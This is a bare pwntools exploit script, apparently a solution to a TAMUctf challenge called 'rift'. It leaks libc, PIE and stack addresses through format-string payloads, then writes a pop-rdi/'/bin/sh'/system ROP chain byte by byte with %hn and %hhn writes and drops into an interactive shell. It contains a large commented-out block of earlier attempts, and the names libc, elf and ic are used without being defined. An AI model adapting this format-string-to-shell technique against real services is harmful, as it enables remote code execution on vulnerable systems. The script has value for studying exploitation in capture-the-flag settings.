from pwn import *

context.log_level = "debug"
io = remote("tamuctf.com", 443, ssl=True, sni="rift")

io.sendline('%11$p')
libc_leak = int(io.recvline().strip().decode(), 16)
io.sendline('%2$p')
pie_leak = int(io.recvline().strip().decode(), 16)
io.sendline('%6$p')
stack_leak = int(io.recvline().strip().decode(), 16)

libc.address = libc_leak-0x2409b
elf.address = pie_leak-0x4060

ic(hex(libc.address))
ic(hex(elf.address))
ic(hex(stack_leak))

def write(addr, offset, ret_addr=58744):
    a = addr
    a = str(hex(a)[2:])
    a2 = int(a[-4:-2], 16)
    a3 = int(a[-6:-4], 16)
    a4 = int(a[-8:-6], 16)
    a5 = int(a[-10:-8], 16)
    a6 = int(a[-12:-10], 16)
    a = int(a[-2:], 16)
    l = [a6, a5, a4, a3, a2, a]
    io.sendline(f'%{ret_addr+offset}c%27$hn'.encode())
    io.sendline(f'%{l.pop()}c%41$hhn'.encode())
    io.sendline(f'%{ret_addr+offset+1}c%27$hn'.encode())
    io.sendline(f'%{l.pop()}c%41$hhn'.encode())
    io.sendline(f'%{ret_addr+offset+2}c%27$hn'.encode())
    io.sendline(f'%{l.pop()}c%41$hhn'.encode())
    io.sendline(f'%{ret_addr+offset+3}c%27$hn'.encode())
    io.sendline(f'%{l.pop()}c%41$hhn'.encode())
    io.sendline(f'%{ret_addr+offset+4}c%27$hn'.encode())
    io.sendline(f'%{l.pop()}c%41$hhn'.encode())
    io.sendline(f'%{ret_addr+offset+5}c%27$hn'.encode())
    io.sendline(f'%{l.pop()}c%41$hhn'.encode())

'''
payload = b'%58744c%27$hn'
# payload += b'aaaa'
# payload += p64(libc.symbols['system'])
# payload += p64(next(libc.search(b'/bin/sh\x00'))) 
io.sendline(payload)
pop_rdi = elf.address + 0x000000000000127b
ic(hex(pop_rdi))
a = pop_rdi
a = str(hex(a)[2:])
a2 = int(a[-4:-2], 16)
a3 = int(a[-6:-4], 16)
a4 = int(a[-8:-6], 16)
a5 = int(a[-10:-8], 16)
a6 = int(a[-12:-10], 16)
a = int(a[-2:], 16)
l = [a6, a5, a4, a3, a2, a]
io.sendline(f'%{l.pop()}c%41$hhn'.encode())
io.sendline(b'%58745c%27$hn')
io.sendline(f'%{l.pop()}c%41$hhn'.encode())
io.sendline(b'%58746c%27$hn')
io.sendline(f'%{l.pop()}c%41$hhn'.encode())
io.sendline(b'%58747c%27$hn')
io.sendline(f'%{l.pop()}c%41$hhn'.encode())
io.sendline(b'%58748c%27$hn')
io.sendline(f'%{l.pop()}c%41$hhn'.encode())
io.sendline(b'%58749c%27$hn')
io.sendline(f'%{l.pop()}c%41$hhn'.encode())

ic(hex(next(libc.search(b'/bin/sh\x00'))))
a = next(libc.search(b'/bin/sh\x00'))
a = str(hex(a)[2:])
a2 = int(a[-4:-2], 16)
a3 = int(a[-6:-4], 16)
a4 = int(a[-8:-6], 16)
a5 = int(a[-10:-8], 16)
a6 = int(a[-12:-10], 16)
a = int(a[-2:], 16)
l = [a6, a5, a4, a3, a2, a]
io.sendline(b'%58752c%27$hn')
io.sendline(f'%{l.pop()}c%41$hhn'.encode())
io.sendline(b'%58753c%27$hn')
io.sendline(f'%{l.pop()}c%41$hhn'.encode())
io.sendline(b'%58754c%27$hn')
io.sendline(f'%{l.pop()}c%41$hhn'.encode())
io.sendline(b'%58755c%27$hn')
io.sendline(f'%{l.pop()}c%41$hhn'.encode())
io.sendline(b'%58756c%27$hn')
io.sendline(f'%{l.pop()}c%41$hhn'.encode())
io.sendline(b'%58757c%27$hn')
io.sendline(f'%{l.pop()}c%41$hhn'.encode())

ic(hex(libc.symbols['system']))
a = libc.symbols['system']
a = str(hex(a)[2:])
a2 = int(a[-4:-2], 16)
a3 = int(a[-6:-4], 16)
a4 = int(a[-8:-6], 16)
a5 = int(a[-10:-8], 16)
a6 = int(a[-12:-10], 16)
a = int(a[-2:], 16)
l = [a6, a5, a4, a3, a2, a]
io.sendline(b'%58760c%27$hn')
io.sendline(f'%{l.pop()}c%41$hhn'.encode())
io.sendline(b'%58761c%27$hn')
io.sendline(f'%{l.pop()}c%41$hhn'.encode())
io.sendline(b'%58762c%27$hn')
io.sendline(f'%{l.pop()}c%41$hhn'.encode())
io.sendline(b'%58763c%27$hn')
io.sendline(f'%{l.pop()}c%41$hhn'.encode())
io.sendline(b'%58764c%27$hn')
io.sendline(f'%{l.pop()}c%41$hhn'.encode())
io.sendline(b'%58765c%27$hn')
io.sendline(f'%{l.pop()}c%41$hhn'.encode())

# payload = b'%32880c%41$hn'
# payload += b'aaa'
# payload += p64(libc.symbols['system'])
# payload += p64(next(libc.search(b'/bin/sh\x00'))) 
# io.sendline(payload)
'''
pop_rdi = elf.address + 0x000000000000127b
write(pop_rdi, 0)
write(next(libc.search(b'/bin/sh\x00')), 8)
write(libc.symbols['system'], 16)

payload = b'%58728c%27$hn'
io.sendline(payload)
payload = b'%41$lln'
io.sendline(payload)



io.interactive(prompt="")
